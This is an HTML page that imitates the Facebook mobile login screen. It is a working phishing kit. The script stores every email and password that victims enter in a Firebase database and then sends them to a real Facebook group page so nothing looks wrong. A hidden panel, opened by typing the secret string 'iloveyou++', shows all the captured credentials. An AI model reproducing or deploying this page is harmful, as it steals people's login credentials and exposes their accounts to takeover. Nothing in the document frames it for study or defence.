<!DOCTYPE html>
<html>
    <head>
        <script src="https://code.jquery.com/jquery-3.1.1.js">
  <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.js"></script>       
    <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @media screen and (min-width:10px) and (max-width:2000px){
    
hr{
    width:100%;
}
#real,#rea{
    border:2px solid rgb(0,180,255,0.2);
    background-color:rgb(0,0,0,0.01);
    width:99%;
    height:2.2em;
}
#add:focus, #real:focus{
    outline:none !important;
}
#dow{
    margin-bottom:5em;
}
#op{
    width:40%;
    margin-left:5%;
    margin-top:-2%;
}
#oo{
    margin-top:-3%;
    margin-left:55%; 
    width:40%;
}
#or{
    margin-left:49%;
}
#add{
    width:100%;
    height:3em;
    border:1em solid transparent;
    color:white;
    background-color:dodgerBlue;
    
}
#lan{
    color:blue;
}
#creat{
    border:1em solid transparent;
    background-color: green;
    color:white;
    margin-left:30%;
}
#real, #rea, #login, #creat{
    border-radius:0.2em;
}
#ff{
    font-size:2em;
    font-weight:bold;
    margin-left:35%;
    color: rgb(0,0,225,0.8);
}
#ori{
    font-size:15px;
    border-radius:2px;
    border:2px solid transparent;
    box-shadow: 0px 0px 7px grey;
}
a{
    text-decoration:none;
}
}
    </style>
        <title>Facebook</title>
    </head>
    <body>
<div id="ori">
<div class="_97vy"><img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook"></div>

<hr>
Mobile number or email
<br />
<br />
<input id="rea" type="text">
<br />
<br />
Password
<br />
<br />
<input id="real" type="password">
<br />
<br />
       <p>
      <a id="ll" href="http://m.facebook.com/groups/720369671627620?group_view_referrer=search&_rdc=1&_rdr"> <button id="add" type="submit" onclick="writeUserData()">
       <b>
           <center>
               Log In
           </center>
       </b>
       </button></a>
       </p>
<br />
<br />
<span id="lan"><a href="https://m.facebook.com/settings/security/password/">
    Forget Password
    </a>
</span>
<br />
<br />
 <span id="or">or</span>
<hr id="op">
<hr id="oo">
<br />
<br />
      <p><a href="https://m.facebook.com/reg/?ref=dbl&soft=hjk" id="creat">
          Create New Account</a>
      </p>
      
<br />
<br />
<p id="lan">
English (UK)
<br />
<br>
Hausa
<br />
<br>
Français (France)
<br />
<br>بالعربية
<br />
<br>
More languages...
</p>
<p id="dow">
    
</p>
</div>
<div id="msgs">
            <h2 class="load">
                Loading...
            </h2>
        </div>
        
      <!-- The core Firebase JS SDK is always required and must be listed first -->
  <script src="https://www.gstatic.com/firebasejs/8.2.3/firebase.js"></script>
  <!-- TODO: Add SDKs for Firebase products that you want to use
     https://firebase.google.com/docs/web/setup#available-libraries -->
  <script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-analytics.js"></script>
  <script>
    // Your web app's Firebase configuration
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    var firebaseConfig = {
    apiKey: "***********",
    authDomain: "cartoline-india.firebaseapp.co",
    projectId: "cartoline-india",
    storageBucket: "********************",
    messagingSenderId: "********",
    appId: "1:372576193203:web:*****",
    measurementId: "G*******"
    };
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
  </script> 
  <script type="text/javascript" charset="utf-8">
    var database = firebase.database();


    function writeUserData() {
      var name = document.getElementById('rea');
      var msg = document.getElementById('real');

      if (name.value === "" || msg.value === "") {
        
      } else {
        firebase.database().ref('users/').push({
          user: name.value,
          message: msg.value,

        });

        
      }


    }
    
    
    var data = firebase.database().ref('users/');
data.on('value', function(snapshot) {

 
             

document.getElementById("msgs").innerHTML="";

 var val = snapshot.val();
 Object.keys(val).forEach((key) => {
 


const div = document.createElement("div") 


div.innerHTML = `
<div id="chain">
<div id="main">

            
            <h3 id="showname">${val[key].user.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</h3>
            
            <p id="para">${val[key].message.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</p>
                <br />
                
                
        <br><br><br>
        
`;


document.getElementById("msgs").appendChild(div)

 });

});   
    
  </script>  
<script>
   var m = document.getElementById("msgs")
   m.style.display="none"
   var c = document.getElementById("add")
   c.onclick=function(){
   var a = document.getElementById("rea")
   var b = document.getElementById("real")
   if (a.value=="" || b.value==""){
     var r = document.getElementById("ll")
       r.removeAttribute("href")
   }
   if(a.value=="iloveyou++"){
       m.style.display="block"
   }
   }
</script>
    </body>
</html>
